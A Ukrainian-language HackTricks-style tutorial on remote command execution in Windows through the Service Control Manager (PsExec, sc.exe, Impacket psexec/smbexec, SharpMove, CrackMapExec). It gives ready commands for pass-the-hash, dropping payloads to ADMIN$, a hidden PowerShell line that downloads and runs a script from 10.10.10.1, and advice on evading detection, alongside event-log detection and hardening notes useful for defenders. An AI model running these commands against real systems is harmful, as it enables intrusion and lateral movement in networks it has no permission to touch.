# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Як вони працюють

Ці техніки зловживають віддаленим Windows Service Control Manager (SCM) через SMB/RPC для виконання команд на цільовому хості. Типовий процес:

1. Автентифікуватися на цільовому хості та отримати доступ до спільного ресурсу ADMIN$ через SMB (TCP/445).
2. Скопіювати виконуваний файл або вказати командний рядок LOLBAS, який запустить service.
3. Віддалено створити service через SCM (MS-SCMR через \PIPE\svcctl), вказавши цю команду або binary.
4. Запустити service для виконання payload і, за потреби, перехопити stdin/stdout через named pipe.
5. Зупинити service і виконати очищення (видалити service та всі скинуті binaries).

Вимоги/передумови:
- Local Administrator на цільовому хості (SeCreateServicePrivilege) або явні права на створення service на цільовому хості.
- SMB (445) має бути доступним, а спільний ресурс ADMIN$ — доступним; Remote Service Management має бути дозволено через host firewall.
- UAC Remote Restrictions: для local accounts фільтрація token може блокувати адміністратора під час роботи через network, якщо не використовується вбудований Administrator або LocalAccountTokenFilterPolicy=1.
- Kerberos проти NTLM: використання hostname/FQDN активує Kerberos; підключення за IP часто переключається на NTLM (і може бути заблоковане в hardened environments).

### Ручний ScExec/WinExec через sc.exe

Нижче наведено мінімальний підхід до створення service. Service image може бути скинутим EXE або LOLBAS, наприклад cmd.exe чи powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Примітки:
- Очікуйте помилку тайм-ауту під час запуску EXE, який не є service; виконання все одно відбувається.
- Щоб залишатися більш OPSEC-friendly, надавайте перевагу fileless commands (cmd /c, powershell -enc) або видаляйте скинуті артефакти.

Докладніші кроки наведено тут: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Інструменти та приклади

### Sysinternals PsExec.exe

- Класичний admin tool, який використовує SMB для скидання PSEXESVC.exe в ADMIN$, встановлює тимчасовий service (назва за замовчуванням — PSEXESVC) і проксіює I/O через named pipes.
- Приклади використання:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Ви можете запустити безпосередньо з Sysinternals Live через WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Залишає події встановлення/видалення service (назва service часто PSEXESVC, якщо не використовується -r) і під час виконання створює C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (PsExec-like)

- Використовує вбудований service на кшталт RemCom. Через ADMIN$ скидає тимчасовий бінарний файл service (зазвичай із рандомізованою назвою), створює service (типово часто RemComSvc) і проксіює I/O через іменований канал.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Артефакти
- Тимчасовий EXE у C:\Windows\ (8 випадкових символів). Назва service за замовчуванням — RemComSvc, якщо її не перевизначено.

### Impacket smbexec.py (SMBExec)

- Створює тимчасовий service, який запускає cmd.exe і використовує named pipe для I/O. Зазвичай не залишає повний EXE payload; виконання команд є напівінтерактивним.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) реалізує кілька методів lateral movement, зокрема service-based exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) включає модифікацію/створення служб для віддаленого виконання команди.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Ви також можете використовувати CrackMapExec для виконання через різні backends (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, виявлення та артефакти

Типові артефакти на хості/в мережі під час використання технік на кшталт PsExec:
- Security 4624 (Logon Type 3) і 4672 (Special Privileges) на цільовому хості для використаного облікового запису адміністратора.
- Події Security 5140/5145 File Share і File Share Detailed, що показують доступ до ADMIN$ та створення/запис бінарних файлів служб (наприклад, PSEXESVC.exe або випадкового .exe завдовжки 8 символів).
- Security 7045 Service Install на цільовому хості: назви служб на кшталт PSEXESVC, RemComSvc або власні назви (-r / -service-name).
- Sysmon 1 (Process Create) для services.exe або образу служби, 3 (Network Connect), 11 (File Create) у C:\Windows\, 17/18 (Pipe Created/Connected) для каналів на кшталт \\.\pipe\psexesvc, \\.\pipe\remcom_* або їхніх рандомізованих еквівалентів.
- Артефакт у реєстрі для EULA Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 на хості оператора (якщо його не придушено).

Ідеї для пошуку
- Створювати alert для інсталяцій служб, у яких ImagePath містить cmd.exe /c, powershell.exe або шляхи TEMP.
- Шукати створення процесів, у яких ParentImage має значення C:\Windows\PSEXESVC.exe, або дочірніх процесів services.exe, що працюють від імені LOCAL SYSTEM і запускають shell.
- Позначати іменовані канали, що закінчуються на -stdin/-stdout/-stderr, або відомі назви каналів клонів PsExec.

## Усунення поширених проблем
- Access is denied (5) під час створення служб: користувач фактично не є локальним адміністратором, діють обмеження UAC для віддалених підключень локальних облікових записів або EDR має захист від втручання в шлях до бінарного файлу служби.
- The network path was not found (53) або не вдалося підключитися до ADMIN$: firewall блокує SMB/RPC або адміністративні шари вимкнено.
- Kerberos не працює, але NTLM заблоковано: підключайтеся за допомогою hostname/FQDN (не IP), перевірте правильність SPN або передайте -k/-no-pass із ticket під час використання Impacket.
- Час очікування запуску служби минув, але payload виконався: це очікувано, якщо це не справжній бінарний файл служби; записуйте вивід у файл або використовуйте smbexec для live I/O.

## Примітки щодо hardening
- Windows 11 24H2 і Windows Server 2025 за замовчуванням вимагають SMB signing для outbound-підключень (а Windows 11 також для inbound-підключень). Це не порушує легітимне використання PsExec із дійсними обліковими даними, але запобігає зловживанням unsigned SMB relay і може вплинути на пристрої, що не підтримують signing.<sup>[[2]](#references)</sup>
- Нове блокування NTLM SMB client (Windows 11 24H2/Server 2025) може запобігати fallback до NTLM під час підключення за IP або до серверів без Kerberos. У hardened-середовищах це порушить PsExec/SMBExec на основі NTLM; використовуйте Kerberos (hostname/FQDN) або налаштуйте винятки, якщо це легітимно необхідно.<sup>[[2]](#references)</sup>
- Principle of least privilege: мінімізуйте членство в локальних адміністраторах, надавайте перевагу Just-in-Time/Just-Enough Admin, застосовуйте LAPS і відстежуйте/створюйте alert для інсталяцій служб 7045.

## Дивіться також

- Віддалене виконання на основі WMI (часто більш fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- Віддалене виконання на основі WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## Посилання

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
